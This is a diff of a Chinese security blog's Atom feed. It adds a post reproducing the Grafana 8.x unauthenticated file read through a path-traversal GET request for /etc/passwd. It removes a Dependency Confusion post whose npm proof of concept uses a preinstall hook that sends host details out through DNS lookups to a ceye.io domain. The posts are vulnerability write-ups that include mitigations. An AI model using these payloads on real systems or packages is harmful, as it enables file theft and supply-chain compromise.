@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://V-alkoinen.github.io</id>
     <title>老白</title>
-    <updated>2022-02-08T08:45:35.059Z</updated>
+    <updated>2022-02-09T05:44:00.595Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://V-alkoinen.github.io"/>
     <link rel="self" href="https://V-alkoinen.github.io/atom.xml"/>
@@ -381,7 +381,7 @@ mimikatz &quot;kerberos::golden /domain:&lt;domain_name&gt; /sid:&lt;SID&gt; /kr
 <img src="https://V-alkoinen.github.io/post-images/1644306782124.png" alt="" loading="lazy"><br>
 <img src="https://V-alkoinen.github.io/post-images/1644306879690.png" alt="" loading="lazy"></p>
 <h1 id="二-搭建sonarqube">二、搭建SonarQube</h1>
-<p>  参考&lt;&gt;</p>
+<p>  参考<a href="https://v-alkoinen.github.io/post/sonarqube-da-jian/">https://v-alkoinen.github.io/post/sonarqube-da-jian/</a></p>
 <h1 id="三-漏洞复现">三、漏洞复现</h1>
 <p>  1、配置SVN<br>
 <img src="https://V-alkoinen.github.io/post-images/1644308908733.png" alt="" loading="lazy"><br>
@@ -624,110 +624,103 @@ v=spf1 a mx ip4:173.194.72.103 -all
 ]]></content>
     </entry>
     <entry>
+        <title type="html"><![CDATA[Grafana未授权任意文件读取漏洞]]></title>
+        <id>https://V-alkoinen.github.io/post/grafana-Unauthorized-reading-of-arbitrary-files/</id>
+        <link href="https://V-alkoinen.github.io/post/grafana-Unauthorized-reading-of-arbitrary-files/">
+        </link>
+        <updated>2021-10-09T03:20:11.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="一-背景">一、背景</h1>
+<p><a href="https://twitter.com/jas502n/status/1468116658531487747?cxt=HHwWhsDSidKU5t8oAAAA">Grafana未授权任意文件读取漏洞</a><br>
+<img src="https://V-alkoinen.github.io/post-images/1644375120664.png" alt="" loading="lazy"></p>
+<h1 id="二-影响范围">二、影响范围</h1>
+<p>  <code>grafana 8.x</code></p>
+<h1 id="三-漏洞复现">三、漏洞复现</h1>
+<pre><code>docker run --name=grafana -d -p 80:3000 grafana/grafana:8.0.1
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://V-alkoinen.github.io/post-images/1644376089892.png" alt="" loading="lazy"></figure>
+<pre><code>GET /public/plugins/cloudwatch/../../../../../../../../../../../../etc/passwd HTTP/1.1
+Host: &lt;host&gt;
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36
+Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8n
+Cookie: redirect_to=%2F
+Connection: close
+</code></pre>
+<p><img src="https://V-alkoinen.github.io/post-images/1644376193114.png" alt="" loading="lazy"><br>
+  通过<code>/api/plugins</code>接口查看所有插件</p>
+<pre><code>GET /api/plugins HTTP/1.1
+Host: &lt;host&gt;
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36
+Accept: */*
+Cookie: grafana_session=ab39f8213543745da2f725f26b026f49
+Connection: close
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://V-alkoinen.github.io/post-images/1644376310734.png" alt="" loading="lazy"></figure>
+<pre><code>#默认插件
+alertmanager
+cloud-monitoring
+cloudwatch
+dashboard
+elasticsearch
+grafana
+grafana-azure-monitor-datasource
+graphite
+influxdb
+jaeger
+loki
+mixed
+mssql
+mysql
+opentsdb
+postgres
+prometheus
+tempo
+testdata
+zipkin
+alertGroups
+alertlist
+annolist
+barchart
+bargauge
+candlestick
+canvas
+dashlist
+debug
+gauge
+geomap
+gettingstarted
+graph
+heatmap
+histogram
+icon
+live
+logs
+news
+nodeGraph
+piechart
+pluginlist
+stat
+state-timeline
+status-history
+table
+table-old
+text
+timeseries
+welcome
+xychart
+</code></pre>
+<h1 id="四-漏洞修复">四、漏洞修复</h1>
+<p>  升级<code>grafana</code>至最新版本后(Grafana v8.3.5)，无该问题。<br>
+<img src="https://V-alkoinen.github.io/post-images/1644376697803.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1644376703581.png" alt="" loading="lazy"></p>
+]]></content>
+    </entry>
+    <entry>
         <title type="html"><![CDATA[DevSecOps 流程]]></title>
         <id>https://V-alkoinen.github.io/post/devsecops-liu-cheng/</id>
         <link href="https://V-alkoinen.github.io/post/devsecops-liu-cheng/">
         </link>
         <updated>2021-10-08T07:42:44.000Z</updated>
         <content type="html"><![CDATA[<figure data-type="image" tabindex="1"><img src="https://V-alkoinen.github.io/post-images/1644133387901.png" alt="" loading="lazy"></figure>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[Dependency Confusion]]></title>
-        <id>https://V-alkoinen.github.io/post/Dependency Confusion/</id>
-        <link href="https://V-alkoinen.github.io/post/Dependency Confusion/">
-        </link>
-        <updated>2021-10-03T05:52:47.000Z</updated>
-        <content type="html"><![CDATA[<h1 id="前言">前言</h1>
-<p>  Dependency Confusion，一个让微软、苹果、PayPal、Shopify等公司给出3W美元赏金的漏洞</p>
-<h1 id="漏洞原理与分析">漏洞原理与分析</h1>
-<p>  我们常用Python、Ruby、Nodejs等编程语言构建项目，都会引用一些依赖包。如果应用的构建使用私有的、内部创建的依赖项，而该依赖项在公共开源存储库中不存在，那么就会发生Dependency Confusion。攻击者能够在公共存储库上以相同的名称注册具有更高版本号的依赖项。然后，最可能发生的是，应用在构建的时候会拉取攻击者在公共依赖库中上传的高版本依赖包，从而执行攻击者的代码。</p>
-<h1 id="漏洞复现">漏洞复现</h1>
-<h4 id="1-访问某站点时发现该站点引用了一部分-npm-包"> 1、访问某站点时发现该站点引用了一部分 npm 包；</h4>
-<figure data-type="image" tabindex="1"><img src="https://V-alkoinen.github.io/post-images/1641207155562.png" alt="" loading="lazy"></figure>
-<h4 id="2-npmjs查找-npm-包并未发现确认为私有包"> 2、<a href="https://www.npmjs.com/">npmjs</a>查找 npm 包，并未发现，确认为私有包；</h4>
-<figure data-type="image" tabindex="2"><img src="https://V-alkoinen.github.io/post-images/1642324613899.png" alt="" loading="lazy"></figure>
-<h4 id="3-注册包名并发布恶意代码以下代码仅作漏洞证明"> 3、注册包名，并发布恶意代码（以下代码仅作漏洞证明）</h4>
-<p> index.js</p>
-<pre><code>const { exec } = require(&quot;child_process&quot;);
-exec(&quot;pwd | xxd -p | while read ut;do dig $ut.xxx.ceye.io;done; b=$(hostname | head | xxd -p) &amp;&amp; nslookup $b.xxx.ceye.io &gt; /dev/null 2&gt;&amp;1; c=$(curl ifconfig.me | head | xxd -p) &amp;&amp; nslookup $c.xxx.ceye.io &gt; /dev/null 2&gt;&amp;1; d=$(echo shineout-mobile | head | xxd -p) &amp;&amp; nslookup $d.xxx.ceye.io &gt; /dev/null 2&gt;&amp;1; e=$(whoami | head | xxd -p ) &amp;&amp; nslookup $a.xxx.ceye.io &gt; /dev/null 2&gt;&amp;1;&quot;, (error, data, getter) =&gt; {
- if(error){
-  console.log(&quot;error&quot;,error.message);
-  return;
- }
- if(getter){
-  console.log(data);
-  return;
- }
- console.log(data);
-
-});
-</code></pre>
-<p> build.js</p>
-<pre><code>exec(&quot;node main.js  &gt; /dev/null 2&gt;&amp;1;&quot;, (error, data, getter) =&gt; {
- if(error){
-  console.log(&quot;error&quot;,error.message);
-  return;
- }
- if(getter){
-  console.log(data);
-  return;
- }
- console.log(data);
-
-});
-</code></pre>
-<p> main.js</p>
-<pre><code>const { exec } = require(&quot;child_process&quot;);
-exec(&quot;node index.js  &gt; /dev/null 2&gt;&amp;1 &amp;&amp; sh setup.sh &gt; /dev/null 2&gt;&amp;1;&quot;, (error, data, getter) =&gt; {
- if(error){
-  console.log(&quot;error&quot;,error.message);
-  return;
- }
- if(getter){
-  console.log(data);
-  return;
- }
- console.log(data);
-
-});
-</code></pre>
-<p> package.json</p>
-<pre><code>{
-  &quot;name&quot;: &quot;&lt;npm_package_name&gt;&quot;,
-  &quot;version&quot;: &quot;2.0.0&quot;,
-  &quot;description&quot;: &quot;&quot;,
-  &quot;main&quot;: &quot;main.js&quot;,
-  &quot;scripts&quot;: {
-    &quot;preinstall&quot;: &quot;node build.js&quot;,
-    &quot;test&quot;: &quot;echo \&quot;Error: no test specified\&quot; &amp;&amp; exit 1&quot;
-  },
-  &quot;author&quot;: &quot;laobai&quot;,
-  &quot;license&quot;: &quot;ISC&quot;,
-  &quot;dependencies&quot;: {
-    &quot;express&quot;: &quot;^4.17.1&quot;,
-    &quot;lodash&quot;: &quot;^4.17.21&quot;
-  }
-}
-</code></pre>
-<p> setup.sh</p>
-<pre><code>#!/usr/bin/bash
-
-pwd | xxd -p | while read ut;do dig $ut.xxx.ceye.io;done;
-b=$(hostname | head | base64) &amp;&amp; dig $b.xxx.ceye.io &gt; /dev/null 2&gt;&amp;1;
-c=$(curl ifconfig.me | head | base64) &amp;&amp; dig $c.xxx.ceye.io &gt; /dev/null 2&gt;&amp;1;
-d=$(echo &quot;shineout-mobile&quot; | head | base64) &amp;&amp; dig $d.xxx.ceye.io &gt; /dev/null 2&gt;&amp;1;
-e=$(whoami | head | base64) &amp;&amp; dig $e.xxx.ceye.io &gt; /dev/null 2&gt;&amp;1;
-</code></pre>
-<h1 id="四-防范">四、防范</h1>
-<p>  1、对于第三方依赖包，均在外部公共库进行注册；<br>
-  2、维护内部源，维护依赖包列表，相关私有包只能从内部源中获取；<br>
-  3、对于从外部源获取的包，采用SCA进行扫描（不过现在市面上的SCA均是以比对漏洞库的形式检测，个人认为必要时可以采用SAST代替这部分的扫描任务）。<br>
-  <a href="https://azure.microsoft.com/zh-cn/resources/3-ways-to-mitigate-risk-using-private-package-feeds/">微软白皮书</a></p>
-<h1 id="五-杂谈">五、杂谈</h1>
-<p>  Dependency Confusion作为供应链攻击的一种，该漏洞已经影响了很多大厂<br>
-<img src="https://V-alkoinen.github.io/post-images/1642329462997.png" alt="" loading="lazy"><br>
-<a href="https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610">相关文章</a></p>
 ]]></content>
     </entry>
 </feed>
